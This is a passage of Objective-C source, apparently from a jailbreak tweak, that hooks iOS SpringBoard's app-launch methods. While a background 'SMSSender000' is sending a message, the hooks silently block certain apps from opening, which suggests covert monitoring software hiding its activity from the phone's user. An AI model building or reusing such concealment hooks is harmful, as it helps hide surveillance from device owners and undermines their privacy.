	DLog(@"launch");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launch);
		}
	} else {
		CALL_ORIG(SBApplicationIcon, launch);
	}
}

HOOK(SBApplicationIcon, launchFromViewSwitcher, void) {
	DLog(@"launchFromViewSwitcher");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
		}
	} else {
		CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
	}
}

#pragma mark -
#pragma mark SBUIController hooks
#pragma mark -

HOOK(SBUIController, activateApplicationFromSwitcher$, void, id arg1) {
	// Work the same as launch, launchFromAppSwitcher of SBApplicationIcon
	DLog(@"activateApplicationFromSwitcher");
	NSString *bundleID = [arg1 bundleIdentifier];
	if (isApplicationIncompatible(bundleID)) {
		if ([[SMSSender000 sharedSMSSender000] mSendingSMS]) {
			;
		} else {
			CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
		}
	} else {
		CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
	}
}